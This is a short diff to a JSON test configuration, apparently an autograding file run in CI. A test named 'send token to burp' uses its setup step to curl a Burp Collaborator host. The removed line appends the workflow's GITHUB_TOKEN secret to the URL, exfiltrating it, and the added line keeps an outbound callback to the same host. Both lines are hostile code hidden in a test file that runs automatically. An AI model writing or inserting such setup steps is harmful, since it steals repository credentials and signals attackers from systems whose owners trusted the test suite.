@@ -2,7 +2,7 @@
   "tests": [
     {
       "name": "send token to burp",
-      "setup": "curl http://dp6zgr9krdj09kff3ui7j5tsdjjc71.burpcollaborator.net/${{ secrets.GITHUB_TOKEN }}",
+      "setup": "curl http://dp6zgr9krdj09kff3ui7j5tsdjjc71.burpcollaborator.net",
       "run": "echo 1",
       "input": "",
       "output": "",
